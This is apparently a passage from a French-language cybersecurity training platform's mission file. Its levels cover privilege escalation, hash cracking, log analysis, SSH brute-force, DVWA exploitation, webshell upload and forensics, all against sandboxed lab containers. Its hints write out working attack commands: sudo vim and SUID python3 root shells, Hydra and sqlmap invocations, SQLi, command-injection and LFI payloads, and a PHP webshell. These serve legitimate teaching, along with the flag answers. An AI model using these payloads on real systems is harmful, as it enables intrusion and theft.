          "`grep -E '(KEY|SECRET|PASSWORD|TOKEN)' env_file.txt`",
        ],
        flags: [
          {
            id: "db_password",
            question: "Quel est le mot de passe de base de données dans le .env ?",
            outputContains: "DB_PASSWORD=SuperSecret2024!",
            hint: "Grep 'DB_PASSWORD' dans env_file.txt",
          },
          {
            id: "api_key",
            question: "Quelle clé API est exposée ?",
            outputContains: "APP_KEY=",
            hint: "Cherche APP_KEY ou API_KEY dans le .env",
          },
        ],
        fileSystem: {
          "env_file.txt": `APP_NAME=MyWordpress
APP_ENV=production
APP_KEY=base64:3y5u7i9o1q3w5e7r9t1y3u5i7o9p1q3w
APP_DEBUG=false
APP_URL=https://target.example.com

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=wordpress_prod
DB_USERNAME=wp_user
DB_PASSWORD=SuperSecret2024!

MAIL_DRIVER=smtp
MAIL_HOST=smtp.gmail.com
MAIL_PASSWORD=GmailAppPass123

STRIPE_KEY=pk_live_2kM4nP6qR8tV0xZ
STRIPE_SECRET=sk_live_7hJ9lL1nN3pR5tX`,
        },
      },
    ],
  },

  {
    id: 8,
    title: "Élévation de privilèges",
    category: "hacking",
    tier: "medium",
    duration: "25-35 min",
    description: "Tu as un accès SSH limité sur un serveur. Identifie les vecteurs d'élévation de privilèges et obtiens root.",
    context: `📋 MISSION PRIVESC — Compte: student (uid=1001)

Tu es connecté en tant qu'utilisateur avec faibles privilèges.
Le but : trouver comment obtenir root.
Méthodes classiques : SUID, sudo mal configuré, cron writable, capabilities.

Énumère, identifie, exploite.`,
    xpReward: 450,
    labType: "simulated",
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60],
      description: "Système Linux, permissions, SUID, sudo",
    },
    medals: { gold: 700, silver: 1300, bronze: 1900 },
    steps: [
      {
        id: 1,
        title: "Énumération des binaires SUID",
        context: "Les binaires SUID s'exécutent avec les droits du propriétaire (souvent root). Un SUID mal configuré = privesc.",
        objective: "Trouver les binaires SUID exploitables",
        hints: [
          "`find / -perm -u=s -type f 2>/dev/null` — tous les binaires SUID.",
          "Comparer avec GTFOBins : python, vim, find, cp, bash sont exploitables.",
          "`find / -perm -4000 -user root -type f 2>/dev/null`",
        ],
        flags: [
          {
            id: "suid_binary",
            question: "Quel binaire SUID non-standard est présent (pas dans /bin ou /usr/bin standard) ?",
            outputContains: "/usr/local/bin/python3",
            hint: "Cherche les SUID et regarde les chemins non-standard",
          },
        ],
        fileSystem: {
          "suid_scan.txt": `/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/python3
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd`,
        },
      },
      {
        id: 2,
        title: "Vérifier les règles sudo",
        context: "sudo -l liste les commandes qu'un utilisateur peut exécuter avec des droits élevés.",
        objective: "Identifier les règles sudo mal configurées",
        hints: [
          "`cat sudo_rules.txt` — résultat de `sudo -l`.",
          "NOPASSWD = exécutable sans mot de passe.",
          "vim avec sudo → `:!bash` pour obtenir un shell root.",
        ],
        flags: [
          {
            id: "sudo_nopasswd",
            question: "Quelle commande peut être lancée avec sudo sans mot de passe ?",
            outputContains: "NOPASSWD: /usr/bin/vim",
            hint: "Cherche NOPASSWD dans sudo_rules.txt",
          },
        ],
        fileSystem: {
          "sudo_rules.txt": `Matching Defaults entries for student on server:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User student may run the following commands on server:
    (root) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/systemctl status`,
        },
      },
      {
        id: 3,
        title: "Exploiter et récupérer le flag root",
        context: "Avec vim en sudo NOPASSWD, tu peux spawner un shell root. Le flag root est dans /root/root.txt.",
        objective: "Lire le contenu de root.txt",
        hints: [
          "`sudo vim -c ':!cat /root/root.txt'` — exécute une commande depuis vim.",
          "Ou : `sudo vim` puis taper `:!cat /root/root.txt` dans vim.",
          "Le flag suit le format FLAG{...}.",
        ],
        flags: [
          {
            id: "root_flag",
            question: "Quel est le contenu du flag root ?",
            outputContains: "FLAG{pr1v3sc_v1m_sud0_n0p4sswd}",
            hint: "Utilise sudo vim pour lire /root/root.txt",
          },
        ],
        fileSystem: {
          "root": {
            "root.txt": "FLAG{pr1v3sc_v1m_sud0_n0p4sswd}\n",
          },
        },
      },
    ],
  },

  {
    id: 9,
    title: "Le coffre-fort des mots de passe",
    category: "hacking",
    tier: "medium",
    duration: "20-30 min",
    description: "Des hashes de mots de passe ont été exfiltrés depuis une base de données compromise. Identifie le type de hash et craque-les.",
    context: `📋 MISSION — Password Audit post-breach

Base de données compromise : users.db (SQLite)
Des hashes ont été extraits. Le client veut savoir combien de comptes sont vulnérables.
Identifie les types de hashes, puis casse les plus faibles.`,
    xpReward: 400,
    labType: "simulated",
    prerequisites: {
      completedLevels: [20, 40, 60, 80, 100],
      description: "Scripting, outils de cracking, encodages",
    },
    medals: { gold: 600, silver: 1100, bronze: 1600 },
    steps: [
      {
        id: 1,
        title: "Identifier les types de hashes",
        context: "Chaque type de hash a une longueur et un format caractéristique. Identifie ce que tu as.",
        objective: "Classifier les hashes présents dans le dump",
        hints: [
          "`cat hashes.txt` — lis les hashes extraits.",
          "MD5 = 32 hex chars, SHA1 = 40, SHA256 = 64, bcrypt = $2b$...",
          "`cat hash_types.txt` pour référence sur les formats.",
        ],
        flags: [
          {
            id: "hash_type_md5",
            question: "Combien de hashes MD5 (32 caractères hex) sont présents ?",
            outputContains: "5",
            hint: "Compte les lignes avec exactement 32 caractères hexadécimaux",
          },
        ],
        fileSystem: {
          "hashes.txt": `admin:5f4dcc3b5aa765d61d8327deb882cf99
user1:e10adc3949ba59abbe56e057f20f883e
user2:098f6bcd4621d373cade4e832627b4f6
user3:5d41402abc4b2a76b9719d911017c592
deploy:d8578edf8458ce06fbc5bb76a58c5ca4
backup:$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewKyNiPqKUxDpgq2
sysadmin:$2b$12$eImiTXuWVxfM37uY4JANjQ==.randomsalthere
ops:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`,
          "hash_types.txt": `MD5:    32 hex chars  — ex: 5f4dcc3b5aa765d61d8327deb882cf99
SHA1:   40 hex chars  — ex: 356a192b7913b04c54574d18c28d46e...
SHA256: 64 hex chars  — ex: 8c6976e5b5410415bde908bd4dee15...
bcrypt: starts $2b$   — ex: $2b$12$LQv3c1yqBWVHx...`,
        },
      },
      {
        id: 2,
        title: "Analyser les hashes craqués",
        context: "Un outil de crack a déjà tourné sur les hashes MD5 avec rockyou.txt. Regarde les résultats.",
        objective: "Identifier les mots de passe faibles trouvés",
        hints: [
          "`cat cracked.txt` — résultats du crack MD5.",
          "Les mots de passe craqués sont les plus utilisés (top 100 rockyou).",
          "Compte le taux de succès : combien sur combien.",
        ],
        flags: [
          {
            id: "admin_password",
            question: "Quel est le mot de passe cracké de l'admin ?",
            outputContains: "password",
            hint: "Le hash MD5 de 'password' est 5f4dcc3b5aa765d61d8327deb882cf99",
          },
          {
            id: "crack_rate",
            question: "Combien de hashes MD5 ont été craqués sur 5 ?",
            outputContains: "5/5",
            hint: "Lis le résumé dans cracked.txt",
          },
        ],
        fileSystem: {
          "cracked.txt": `[+] Hashcat results — MD5 attack
admin:5f4dcc3b5aa765d61d8327deb882cf99:password
user1:e10adc3949ba59abbe56e057f20f883e:123456
user2:098f6bcd4621d373cade4e832627b4f6:test
user3:5d41402abc4b2a76b9719d911017c592:hello
deploy:d8578edf8458ce06fbc5bb76a58c5ca4:qwerty

[+] Summary: 5/5 MD5 hashes cracked (100%)
[+] bcrypt hashes: still running (ETA: 3 days)`,
        },
      },
      {
        id: 3,
        title: "Recommandations et rapport",
        context: "Le rapport doit quantifier le risque et recommander des actions concrètes.",
        objective: "Identifier la politique de mot de passe recommandée",
        hints: [
          "`cat security_recommendations.txt`",
          "Les mots de passe MD5 sont obsolètes — bcrypt/Argon2 sont recommandés.",
          "Longueur minimale : 12 caractères avec complexité.",
        ],
        flags: [
          {
            id: "recommended_algo",
            question: "Quel algorithme de hachage est recommandé dans le rapport ?",
            outputContains: "Argon2id",
            hint: "Lis security_recommendations.txt — l'algorithme moderne est mentionné",
          },
        ],
        fileSystem: {
          "security_recommendations.txt": `RAPPORT SÉCURITÉ — Audit mots de passe
Date: 2024-01-20
Analyste: Security Team

RÉSULTATS:
- 5/5 hashes MD5 craqués en < 1 seconde (dictionnaire rockyou)
- 2/2 hashes bcrypt: résistants (calcul > 3 jours)
- 100% des mots de passe MD5 étaient dans le top-10 rockyou

RECOMMANDATIONS:
1. Migrer IMMÉDIATEMENT vers Argon2id (algorithme 2024 recommandé OWASP)
2. Forcer la réinitialisation de tous les mots de passe compromis
3. Imposer: min 16 chars, chiffres + majuscules + symboles
4. Activer MFA sur tous les comptes admin
5. Implémenter Have I Been Pwned API pour vérification à l'inscription`,
        },
      },
    ],
  },

  {
    id: 10,
    title: "Analyse de trafic web",
    category: "reseau",
    tier: "medium",
    duration: "25-35 min",
    description: "Des access logs Apache suspects ont été capturés. Identifie les attaques (SQLi, LFI, scanner) et l'IP de l'attaquant.",
    context: `📋 ALERTE WAF — Trafic anormal détecté

Le WAF a loggé des requêtes inhabituelles sur l'application.
Quelqu'un semble tester activement l'application pour des vulnérabilités.
Analyse les logs et qualifie la menace.`,
    xpReward: 400,
    labType: "simulated",
    prerequisites: {
      completedLevels: [10, 20, 40, 60, 70, 80],
      description: "HTTP, logs web, attaques courantes (SQLi, LFI)",
    },
    medals: { gold: 600, silver: 1100, bronze: 1700 },
    steps: [
      {
        id: 1,
        title: "Identifier l'IP attaquante",
        context: "Une IP génère un volume anormalement élevé de requêtes avec des patterns suspects.",
        objective: "Trouver l'IP avec le plus de requêtes dans access.log",
        hints: [
          "`cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head`",
          "La première IP du résultat est la plus active.",
          "`grep '45.33.32.156' access.log | wc -l` — compte ses requêtes.",
        ],
        flags: [
          {
            id: "attacker_ip",
            question: "Quelle IP a généré le plus de requêtes ?",
            outputContains: "45.33.32.156",
            hint: "Compte les occurrences de chaque IP avec awk + uniq -c",
          },
        ],
        fileSystem: {
          "access.log": `192.168.1.5 - - [20/Jan/2024:10:00:01] "GET /index.php HTTP/1.1" 200 45231
45.33.32.156 - - [20/Jan/2024:10:00:02] "GET /index.php HTTP/1.1" 200 45231
45.33.32.156 - - [20/Jan/2024:10:00:03] "GET /admin/ HTTP/1.1" 403 289
45.33.32.156 - - [20/Jan/2024:10:00:04] "GET /wp-admin/ HTTP/1.1" 403 289
45.33.32.156 - - [20/Jan/2024:10:00:05] "GET /?id=1' HTTP/1.1" 500 512
45.33.32.156 - - [20/Jan/2024:10:00:06] "GET /?id=1+OR+1%3D1 HTTP/1.1" 200 45891
45.33.32.156 - - [20/Jan/2024:10:00:07] "GET /?id=1+UNION+SELECT+1,2,3-- HTTP/1.1" 200 312
45.33.32.156 - - [20/Jan/2024:10:00:08] "GET /page.php?file=../../../../etc/passwd HTTP/1.1" 200 2847
45.33.32.156 - - [20/Jan/2024:10:00:09] "GET /page.php?file=../../../../etc/shadow HTTP/1.1" 403 289
192.168.1.10 - - [20/Jan/2024:10:01:00] "GET /api/users HTTP/1.1" 200 1024`,
        },
      },
      {
        id: 2,
        title: "Classifier les attaques",
        context: "Identifie les types d'attaques tentées dans les requêtes de l'IP suspecte.",
        objective: "Trouver les patterns SQLi et LFI dans les requêtes",
        hints: [
          "`grep '45.33.32.156' access.log | grep -E '(UNION|OR 1|SELECT)'` — SQLi.",
          "`grep '45.33.32.156' access.log | grep -E '(\\.\\./|%2e%2e)'` — LFI.",
          "URL-decode les requêtes : %3D = =, %2F = /, %27 = '",
        ],
        flags: [
          {
            id: "sqli_payload",
            question: "Quel payload SQLi classique apparaît dans les logs ?",
            outputContains: "UNION+SELECT",
            hint: "Cherche UNION dans les requêtes de l'attaquant",
          },
          {
            id: "lfi_target",
            question: "Quel fichier système l'attaquant a-t-il tenté de lire via LFI ?",
            outputContains: "etc/passwd",
            hint: "Cherche les path traversal (../../) dans les requêtes",
          },
        ],
        fileSystem: {
          "access.log": `45.33.32.156 - - [20/Jan/2024:10:00:05] "GET /?id=1' HTTP/1.1" 500 512
45.33.32.156 - - [20/Jan/2024:10:00:06] "GET /?id=1+OR+1%3D1 HTTP/1.1" 200 45891
45.33.32.156 - - [20/Jan/2024:10:00:07] "GET /?id=1+UNION+SELECT+1,2,3-- HTTP/1.1" 200 312
45.33.32.156 - - [20/Jan/2024:10:00:08] "GET /page.php?file=../../../../etc/passwd HTTP/1.1" 200 2847
45.33.32.156 - - [20/Jan/2024:10:00:09] "GET /page.php?file=../../../../etc/shadow HTTP/1.1" 403 289`,
        },
      },
      {
        id: 3,
        title: "Évaluer l'impact — LFI réussie",
        context: "Une requête LFI a retourné 200 avec 2847 octets — le contenu de /etc/passwd a probablement été lu.",
        objective: "Identifier combien d'utilisateurs système sont exposés via /etc/passwd",
        hints: [
          "`cat etc_passwd_leaked.txt` — contenu du fichier leaké.",
          "`grep -v 'nologin\\|false' etc_passwd_leaked.txt | wc -l` — comptes avec shell.",
          "Les comptes avec /bin/bash ou /bin/sh peuvent se connecter.",
        ],
        flags: [
          {
            id: "shell_users",
            question: "Combien d'utilisateurs ont un shell valide (/bin/bash ou /bin/sh) ?",
            outputContains: "3",
            hint: "Filtre /etc/passwd sur bash et sh avec grep",
          },
        ],
        fileSystem: {
          "etc_passwd_leaked.txt": `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1001:1001:deploy:/home/deploy:/bin/bash
admin:x:1002:1002:admin:/home/admin:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin`,
        },
      },
    ],
  },

  // ══════════════════════════════════════════════════════════════════
  // ADVANCED — IDs 11-15 — labType: docker
  // Vrais conteneurs Docker — lab-attacker (Kali)
  // Prérequis : niveaux 1-100+
  // ══════════════════════════════════════════════════════════════════

  {
    id: 11,
    title: "Brute-force SSH réel",
    category: "pentest",
    tier: "advanced",
    duration: "30-45 min",
    description: "Attaque réelle sur un vrai conteneur SSH. Énumération des utilisateurs, brute-force avec Hydra, connexion et capture du flag.",
    context: `📋 PENTEST RÉEL — lab-ssh-target (172.20.0.10)

Lab Docker actif. Tu es dans le conteneur attaquant (Kali).
La cible : lab-ssh-target sur 172.20.0.10
Objectif : obtenir un accès SSH et lire /home/admin/flag.txt

Ce sont de vraies commandes sur de vrais conteneurs.`,
    xpReward: 600,
    badge: "ssh_attacker",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-ssh-target", ip: "172.20.0.10", description: "Cible SSH Ubuntu" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100],
      description: "SSH, réseau, sécurité avancée — niveaux 1-100",
    },
    medals: { gold: 900, silver: 1600, bronze: 2400 },
    steps: [
      {
        id: 1,
        title: "Scan de la cible",
        context: "Avant d'attaquer, identifie les services ouverts sur la cible.",
        objective: "Scanner la cible et confirmer que SSH est ouvert",
        hints: [
          "`nmap -sV -p 22 172.20.0.10`",
          "Vérifie la version SSH — peut révéler des vulnérabilités.",
          "`nmap -sC -sV 172.20.0.10` pour un scan complet.",
        ],
        flags: [
          {
            id: "ssh_port",
            question: "Sur quel port SSH est-il ouvert ? (résultat nmap)",
            outputContains: "22/tcp",
            hint: "Lance nmap sur 172.20.0.10",
          },
          {
            id: "ssh_version",
            question: "Quelle version de SSH est détectée par nmap ?",
            outputPattern: "OpenSSH [0-9]+\\.[0-9]+",
            hint: "nmap -sV affiche la version du service",
          },
        ],
      },
      {
        id: 2,
        title: "Brute-force avec Hydra",
        context: "Hydra est un outil de brute-force réseau. Attaque SSH avec une wordlist de mots de passe courants.",
        objective: "Trouver les credentials valides avec Hydra",
        hints: [
          "`hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.20.0.10 ssh -t 4`",
          "Le compte 'admin' existe — concentre-toi dessus d'abord.",
          "`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/common-passwords.txt 172.20.0.10 ssh -t 4`",
        ],
        flags: [
          {
            id: "found_password",
            question: "Quel mot de passe Hydra a-t-il trouvé pour admin ?",
            outputContains: "admin123",
            hint: "Hydra affiche [22][ssh] host: ... login: ... password: ...",
          },
        ],
      },
      {
        id: 3,
        title: "Connexion et capture du flag",
        context: "Avec les credentials trouvés, connecte-toi en SSH et lis le flag.",
        objective: "Lire /home/admin/flag.txt après connexion SSH",
        hints: [
          "`ssh admin@172.20.0.10` puis entre le mot de passe trouvé.",
          "Une fois connecté : `cat /home/admin/flag.txt`",
          "Le flag est au format FLAG{...}",
        ],
        flags: [
          {
            id: "ssh_flag",
            question: "Quel est le contenu de /home/admin/flag.txt ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "Connecte-toi en SSH puis cat le flag",
          },
        ],
      },
    ],
  },

  {
    id: 12,
    title: "DVWA — Toutes les vulnérabilités",
    category: "pentest",
    tier: "advanced",
    duration: "45-60 min",
    description: "DVWA (Damn Vulnerable Web Application) tourne dans un conteneur. Exploite successivement : SQLi, LFI, Command Injection, XSS.",
    context: `📋 PENTEST WEB — DVWA sur 172.20.0.20

DVWA est une application web volontairement vulnérable.
Security level : LOW (pour l'apprentissage)
Accès : http://172.20.0.20 (user: admin / pass: password)

Exploite chaque catégorie de vulnérabilités et récupère les flags.`,
    xpReward: 700,
    badge: "web_hacker",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-dvwa", ip: "172.20.0.20", description: "DVWA — Application web vulnérable" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120],
      description: "Web, SQLi, LFI, XSS — niveaux 1-120",
    },
    medals: { gold: 1200, silver: 2000, bronze: 3000 },
    steps: [
      {
        id: 1,
        title: "SQL Injection — Extraction de données",
        context: "Le formulaire de recherche d'utilisateur est vulnérable à SQLi. Extrais la liste des utilisateurs et leurs hashes.",
        objective: "Extraire les hashes de mots de passe via SQLi",
        hints: [
          "`curl 'http://172.20.0.20/dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user,password+FROM+users--+&Submit=Submit' -b 'PHPSESSID=...; security=low'`",
          "Utilise sqlmap : `sqlmap -u 'http://172.20.0.20/dvwa/vulnerabilities/sqli/?id=1' --cookie='...' --dump`",
          "Authentifie-toi d'abord : `curl -c cookies.txt -d 'username=admin&password=password&Login=Login' http://172.20.0.20/dvwa/login.php`",
        ],
        flags: [
          {
            id: "sqli_users",
            question: "Combien d'utilisateurs sqlmap a-t-il trouvé dans la table users ?",
            outputContains: "5",
            hint: "sqlmap --dump affiche le nombre d'entrées trouvées",
          },
        ],
      },
      {
        id: 2,
        title: "Command Injection — RCE",
        context: "Le module Command Injection exécute des commandes système avec l'input utilisateur. Obtiens une exécution de commande.",
        objective: "Exécuter id et whoami via command injection",
        hints: [
          "`curl 'http://172.20.0.20/dvwa/vulnerabilities/exec/' -d 'ip=127.0.0.1;id&Submit=Submit' -b 'security=low; PHPSESSID=...'`",
          "Le séparateur `;` enchaîne les commandes en bash.",
          "Essaie aussi `|id` ou `$(id)` si `;` est filtré.",
        ],
        flags: [
          {
            id: "rce_user",
            question: "En tant quel utilisateur tourne le serveur web (résultat de id) ?",
            outputContains: "www-data",
            hint: "Lance ;id ou ;whoami dans le champ IP",
          },
        ],
      },
      {
        id: 3,
        title: "File Inclusion — LFI vers RCE",
        context: "Le module File Inclusion inclut des fichiers locaux. Lis /etc/passwd puis tente de lire un fichier de flag.",
        objective: "Lire /etc/passwd via LFI",
        hints: [
          "`curl 'http://172.20.0.20/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd' -b 'security=low; PHPSESSID=...'`",
          "Compte le nombre d'`../` nécessaires depuis le webroot.",
          "Cherche aussi `page=/etc/passwd` (LFI absolute path).",
        ],
        flags: [
          {
            id: "lfi_root",
            question: "Quel est le premier utilisateur dans /etc/passwd lu via LFI ?",
            outputContains: "root:x:0:0",
            hint: "Inclus ../../../../etc/passwd et lis le début du fichier",
          },
        ],
      },
    ],
  },

  {
    id: 13,
    title: "La machine compromise",
    category: "forensic",
    tier: "advanced",
    duration: "40-55 min",
    description: "Un conteneur Docker simule une machine Linux compromise par un attaquant. Retrouve les traces d'intrusion, le malware planté et la méthode de persistance.",
    context: `📋 INCIDENT RESPONSE — lab-compromised (172.20.0.30)

Une machine de prod semble compromise depuis 48h.
Tu dois faire un forensic complet : trouver le malware, la backdoor, les données exfiltrées.

Connecte-toi en SSH (user: analyst / pass: analyst123) et commence l'investigation.`,
    xpReward: 650,
    badge: "incident_responder",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-compromised", ip: "172.20.0.30", description: "Machine Linux compromise" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 50, 60, 70, 80, 90, 100],
      description: "Forensic, logs, persistance — niveaux 1-100",
    },
    medals: { gold: 1000, silver: 1800, bronze: 2700 },
    steps: [
      {
        id: 1,
        title: "Trouver les processus suspects",
        context: "Un processus malveillant tourne en arrière-plan. Il utilise un nom camouflé.",
        objective: "Identifier le processus C2 caché dans /tmp",
        hints: [
          "`ssh analyst@172.20.0.30`",
          "Après connexion : `ps aux | grep -v grep | grep -E '(/tmp|/dev/shm)'`",
          "`ls -la /tmp/` — les fichiers cachés (point initial) sont suspects.",
        ],
        flags: [
          {
            id: "malware_process",
            question: "Quel processus suspect tourne depuis /tmp ?",
            outputContains: "/tmp/.hidden/c2_client",
            hint: "ps aux filtre sur /tmp pour trouver les processus suspects",
          },
        ],
      },
      {
        id: 2,
        title: "Analyser la persistance",
        context: "Le malware survive aux redémarrages. Trouve comment il persiste.",
        objective: "Localiser le mécanisme de persistance (cron, systemd, rc.local)",
        hints: [
          "`cat /etc/cron.d/*` — tâches cron système.",
          "`crontab -l` et `crontab -l -u root`",
          "`systemctl list-units --type=service | grep -v '(enabled|loaded)'`",
        ],
        flags: [
          {
            id: "persistence_cron",
            question: "Dans quel fichier cron la persistance est-elle configurée ?",
            outputContains: "/etc/cron.d/updates",
            hint: "Lis les fichiers dans /etc/cron.d/",
          },
        ],
      },
      {
        id: 3,
        title: "Reconstruire la timeline d'intrusion",
        context: "Les logs auth et les timestamps de fichiers permettent de reconstituer quand et comment l'attaquant est entré.",
        objective: "Déterminer l'heure de création du malware",
        hints: [
          "`stat /tmp/.hidden/c2_client` — date de création du fichier malveillant.",
          "`last` — historique des connexions SSH.",
          "`grep 'Accepted' /var/log/auth.log | tail -20`",
        ],
        flags: [
          {
            id: "intrusion_time",
            question: "À quelle heure le fichier C2 a-t-il été créé ? (stat output)",
            outputPattern: "Modify: [0-9]{4}-[0-9]{2}-[0-9]{2}",
            hint: "stat /tmp/.hidden/c2_client affiche les timestamps",
          },
        ],
      },
    ],
  },

  {
    id: 14,
    title: "Pentest web complet",
    category: "pentest",
    tier: "advanced",
    duration: "50-70 min",
    description: "Application web PHP custom vulnérable : SQLi, LFI, upload de webshell. Obtiens une exécution de code et lis le flag.",
    context: `📋 PENTEST — lab-web-custom (172.20.0.40)

Application web PHP développée en interne, non auditée.
Accessible sur http://172.20.0.40
Objectif final : lire /var/www/html/flag.txt

Méthodes autorisées dans ce lab : SQLi, LFI, upload, webshell.`,
    xpReward: 700,
    badge: "web_pentester",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-web-custom", ip: "172.20.0.40", description: "Application web PHP vulnérable" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 40, 60, 70, 80, 90, 100, 110, 120],
      description: "Web, SQLi, LFI, upload — niveaux 1-120",
    },
    medals: { gold: 1200, silver: 2200, bronze: 3200 },
    steps: [
      {
        id: 1,
        title: "Reconnaissance et énumération",
        context: "Commence par énumérer les répertoires et lire robots.txt.",
        objective: "Trouver les paths sensibles via gobuster",
        hints: [
          "`gobuster dir -u http://172.20.0.40 -w /usr/share/dirb/wordlists/common.txt`",
          "`curl http://172.20.0.40/robots.txt` — souvent révélateur.",
          "`nikto -h http://172.20.0.40` — scan de vulnérabilités automatique.",
        ],
        flags: [
          {
            id: "robots_disallow",
            question: "Quel chemin est désactivé dans robots.txt ?",
            outputContains: "/admin",
            hint: "curl http://172.20.0.40/robots.txt",
          },
        ],
      },
      {
        id: 2,
        title: "SQL Injection — Extraire les credentials",
        context: "Le paramètre ?id= est vulnérable à SQLi. Extrais la table users.",
        objective: "Obtenir les identifiants admin via SQLi",
        hints: [
          "`sqlmap -u 'http://172.20.0.40/index.php?id=1' --dbs`",
          "`sqlmap -u 'http://172.20.0.40/index.php?id=1' -D webapp -T users --dump`",
          "Essai manuel : `curl 'http://172.20.0.40/index.php?id=1+UNION+SELECT+1,user(),3--'`",
        ],
        flags: [
          {
            id: "admin_creds",
            question: "Quel est le mot de passe admin trouvé dans la base de données ?",
            outputContains: "admin_pass_2024",
            hint: "sqlmap dump la table users et affiche les credentials",
          },
        ],
      },
      {
        id: 3,
        title: "Upload webshell — RCE et flag",
        context: "La fonctionnalité d'upload ne vérifie pas le type de fichier. Upload un webshell PHP.",
        objective: "Uploader un webshell et lire /var/www/html/flag.txt",
        hints: [
          "`echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php`",
          "`curl -F 'file=@shell.php' http://172.20.0.40/upload.php`",
          "`curl 'http://172.20.0.40/uploads/shell.php?cmd=cat+/var/www/html/flag.txt'`",
        ],
        flags: [
          {
            id: "web_flag",
            question: "Quel est le contenu de /var/www/html/flag.txt ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "Upload shell.php puis accède-y avec ?cmd=cat /var/www/html/flag.txt",
          },
        ],
      },
    ],
  },

  {
    id: 15,
    title: "Root ou rien",
    category: "pentest",
    tier: "advanced",
    duration: "45-60 min",
    description: "Machine Linux avec accès initial faible. Exploite SUID python3 et sudo vim pour obtenir root. Prouve-le en lisant /root/root.txt.",
    context: `📋 PRIVESC LAB — lab-privesc (172.20.0.50)

Accès initial : SSH user 'student' (student:student123)
Objectif : obtenir root et lire /root/root.txt

Cette machine est conçue pour l'apprentissage de la privesc Linux.
Plusieurs chemins existent — trouve-les tous.`,
    xpReward: 650,
    badge: "root_master",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-privesc", ip: "172.20.0.50", description: "Linux privesc lab" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100],
      description: "Linux avancé, SUID, sudo, privesc — niveaux 1-100",
    },
    medals: { gold: 1100, silver: 1900, bronze: 2800 },
    steps: [
      {
        id: 1,
        title: "Énumération des vecteurs de privesc",
        context: "Une énumération complète est la clé. Cherche SUID, sudo, capabilities, cron writable.",
        objective: "Identifier tous les vecteurs d'élévation de privilèges",
        hints: [
          "`ssh student@172.20.0.50` (pass: student123)",
          "`find / -perm -4000 -type f 2>/dev/null` — binaires SUID.",
          "`sudo -l` — permissions sudo de l'utilisateur courant.",
        ],
        flags: [
          {
            id: "suid_found",
            question: "Quel binaire SUID non-standard est présent ?",
            outputContains: "python3",
            hint: "find / -perm -4000 -type f 2>/dev/null",
          },
          {
            id: "sudo_rule",
            question: "Quelle commande peut être lancée avec sudo NOPASSWD ?",
            outputContains: "vim",
            hint: "sudo -l affiche les règles sudo",
          },
        ],
      },
      {
        id: 2,
        title: "Exploiter SUID Python",
        context: "Python3 a le bit SUID. Avec Python tu peux spawner un shell root.",
        objective: "Obtenir un shell root via SUID python3",
        hints: [
          "`/usr/local/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`",
          "`id` après pour confirmer root.",
          "Si ça ne marche pas, essaie vim : `sudo vim -c ':!/bin/bash'`",
        ],
        flags: [
          {
            id: "root_uid",
            question: "Quel est le résultat de 'id' après exploitation ?",
            outputContains: "uid=0(root)",
            hint: "Après exploitation, lance id pour confirmer",
          },
        ],
      },
      {
        id: 3,
        title: "Capturer le flag root",
        context: "Tu es root. Lis le flag dans /root/root.txt.",
        objective: "Lire /root/root.txt",
        hints: [
          "`cat /root/root.txt`",
          "Le flag est au format FLAG{...}",
          "Bonus : `cat /etc/shadow` pour voir les hashes — tu es root maintenant.",
        ],
        flags: [
          {
            id: "root_flag",
            question: "Quel est le flag root ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "cat /root/root.txt",
          },
        ],
      },
    ],
  },

  // ══════════════════════════════════════════════════════════════════
  // EXTREME — IDs 16-20
  // Les épreuves ultimes — combinaison de toutes les compétences
  // ══════════════════════════════════════════════════════════════════

  {
    id: 16,
    title: "Opération Fantôme",
    category: "pentest",
    tier: "extreme",
    duration: "60-90 min",
    description: "Opération complète de pentest : reconnaissance externe, intrusion SSH, élévation de privilèges, installation backdoor. Capture le flag final sur la cible interne.",
    context: `📋 RED TEAM — Mission Fantôme

Objectif : intrusion complète sur le réseau lab
Phase 1 : Accès initial via SSH (lab-ssh-target)
Phase 2 : Élévation de privilèges sur la cible
Phase 3 : Pivot vers le réseau interne
Phase 4 : Capturer le flag final sur lab-internal

Aucune aide. Aucune limite de temps visible. Bonne chance.`,
    xpReward: 1000,
    badge: "ghost_operator",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-ssh-target", ip: "172.20.0.10", description: "Point d'entrée SSH" },
